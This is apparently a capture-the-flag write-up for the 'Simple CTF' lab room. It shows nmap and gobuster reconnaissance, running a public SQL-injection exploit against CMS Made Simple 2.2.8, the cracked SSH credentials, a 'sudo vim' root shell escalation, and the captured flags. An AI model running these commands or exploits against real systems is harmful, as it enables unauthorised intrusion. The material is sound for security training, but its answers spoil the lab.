# Hi, I'm a Cybersecurity Analyst 
### Focused on analyzing threats, demonstrating attack scenarios, and conducting security investigations.
<img width="1577" height="324" alt="image" src="https://github.com/user-attachments/assets/a7c9a08f-5dc6-4ff8-a930-89e455d6a6c9" />

### Simple CTF
### Turn on the Target machine- 10.48.136.159
<img width="1295" height="272" alt="image" src="https://github.com/user-attachments/assets/93c21b2b-07a3-46c5-b4a2-022d8e1d6d00" />

### Lets perform reconnaisance on the target machine 
### nmap -sC -sV -p- 10.48.136.159
<img width="1918" height="807" alt="image" src="https://github.com/user-attachments/assets/73aaf1d5-5dd7-4350-8199-4cc80e6ce748" />

### Port 21,80,2222 are open.
<img width="1293" height="257" alt="image" src="https://github.com/user-attachments/assets/41034def-a991-4b34-aa3d-d7a6565a39f4" />

### Lets navigate to the web page
<img width="1918" height="841" alt="image" src="https://github.com/user-attachments/assets/89c3dc52-5780-4fd3-b6f6-c3f4ef2350d8" />

### Looks like a normal page. 
### Lets enumarate the website using gobuster 
### gobuster -u dir http://10.48.136.159 -w /usr/share/dirb/wordlists/common.txt
<img width="1408" height="671" alt="image" src="https://github.com/user-attachments/assets/d5f2a0bc-966e-473b-b2a4-8e5ab04dfaa3" />

### We found the /simple directory and lets naviagte to it
<img width="1710" height="995" alt="image" src="https://github.com/user-attachments/assets/807deabe-31fd-4683-9b26-2dae60e1c347" />

### Lets scroll down
<img width="1445" height="318" alt="image" src="https://github.com/user-attachments/assets/b63a1d44-d80d-4583-837f-713a6816669e" />

### The site is powered by the CMS made simple version 2.2.8

### Due to the limited time target machine is closed. Lets restart it again
  ### Target machine - 10.48.190.184
<img width="1299" height="273" alt="image" src="https://github.com/user-attachments/assets/c7efa28a-1958-4406-8849-e2065792816b" />

### Lets search for the exploit in the kali
### searchsploit 'made simple'
<img width="1821" height="1023" alt="image" src="https://github.com/user-attachments/assets/a0083643-983b-46cc-84ca-573339609a99" />

### Lets locate this sql exploit , enter the command Locate 46635.py and copy to the present working directory : Desktop
<img width="1281" height="175" alt="image" src="https://github.com/user-attachments/assets/d7d3e162-5481-4c46-93e5-37af17e1fd6f" />

### Lets view the scripts
<img width="1576" height="1026" alt="image" src="https://github.com/user-attachments/assets/0fea769c-530d-4f43-a084-cfcf8d8430e3" />

### Enter the command python2.7 46635.py
<img width="955" height="164" alt="image" src="https://github.com/user-attachments/assets/9d6aef99-a443-49f6-b5b5-20b8f50cf892" />

### Lets execute the script enter the command 
### python2.7 46635.py -u http://10.48.190.184/simple -c -w /opt/rockyou.txt
<img width="3320" height="288" alt="image" src="https://github.com/user-attachments/assets/b89ccb29-6adb-4578-b72e-09ce37bc0108" />

### We have received username and the password 
<img width="948" height="236" alt="image" src="https://github.com/user-attachments/assets/cde7fc42-2e7f-4627-9791-3bfd0756731d" />

### Username : mitch
### Password : secret

### Since we have username and password lets connect the target machine 10.10.29.180 using ssh
<img width="908" height="116" alt="image" src="https://github.com/user-attachments/assets/0d9b728d-10dc-4858-802f-8309e4ea3a23" />

### ssh mitch@10.10.29.180 -p 2222 and enter the password 
<img width="954" height="599" alt="image" src="https://github.com/user-attachments/assets/c3bbb2f4-e4c1-45ca-9309-1d3639b23432" />

### We are Successfully logged into the system
### enter id 
<img width="957" height="156" alt="image" src="https://github.com/user-attachments/assets/ccdf0dba-9ceb-4c64-a803-ed58913ac00f" />

### we can see the user is mitch
### After ls command we can see the user.txt and use cat command to read it
<img width="949" height="218" alt="image" src="https://github.com/user-attachments/assets/b24610ed-f752-4dfc-9371-88bb117a8a38" />

### We found the user flag : G00d j0b, keep up!
### Q.Is there any other user in the home directory? What's its name?
### Lets navigate to home directory cd /home and ls to list out
<img width="633" height="73" alt="image" src="https://github.com/user-attachments/assets/5b4fb0b2-08e6-483c-b624-5f0d7bb68b20" />

### We found sunbath

### Q.What can you leverage to spawn a privileged shell?
### Lets perform privilege escalation process enter sudo -l  to see all the permissions does the user have
<img width="950" height="134" alt="image" src="https://github.com/user-attachments/assets/e2518871-a8cc-4356-b5eb-09fe1fa8c24a" />

### We see the user mitch has access to run vi editor through vim as root/admin no password required 
### Lets go to GTFObins and search for vim
<img width="790" height="387" alt="image" src="https://github.com/user-attachments/assets/d1424213-2c80-4ac0-8ec9-ea8ab466b0d4" />

### Select vim and sudo and copy the command
### sudo vim -c ':!/bin/sh'
<img width="945" height="175" alt="image" src="https://github.com/user-attachments/assets/6e4584ca-ddbc-48a6-bc3f-96583232421f" />

### Now we can see we are the root user
### Enter command ls to see the files 
<img width="955" height="293" alt="image" src="https://github.com/user-attachments/assets/a17176fe-f7e1-48ba-a6e5-d036e192dc0a" />

### We can see root.txt now we can use cat command to read it
<img width="958" height="297" alt="image" src="https://github.com/user-attachments/assets/c829310d-6e24-4065-9f1a-d83c030ba4a5" />

### We have found the flag: W3ll d0n3. You made it!

### Answers 
<img width="1652" height="813" alt="image" src="https://github.com/user-attachments/assets/fca0181d-2ab5-4130-b6b5-bee2a12a0392" />

## Congratulations !!! We have Successfully Completed the Room.
<img width="1644" height="408" alt="image" src="https://github.com/user-attachments/assets/3117b418-a4bb-44aa-9899-c7764a72477a" />





